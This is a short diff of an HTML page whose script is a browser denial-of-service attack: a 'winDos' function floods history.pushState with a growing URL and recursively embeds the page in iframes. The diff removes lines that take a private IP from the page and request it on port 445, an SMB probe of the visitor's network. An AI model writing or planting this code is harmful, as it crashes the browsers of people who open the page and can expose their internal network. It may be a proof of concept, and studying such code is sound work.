@@ -2,14 +2,11 @@
 <body>
 <script>
 var total = "";
-    var x = new Image();
-    privip = document.getElementById("list").innerHTML.split(' ')[0];
     function winDos() {
       for( var i = 0; i < 100000; i++ ) {
           total = total + i.toString();
           history.pushState(0,0, total );
       }
-      x.src = privip+':445';
       var y = document.createElement('iframe');
       y.src=window.location.href;
       document.body.appendChild(y);
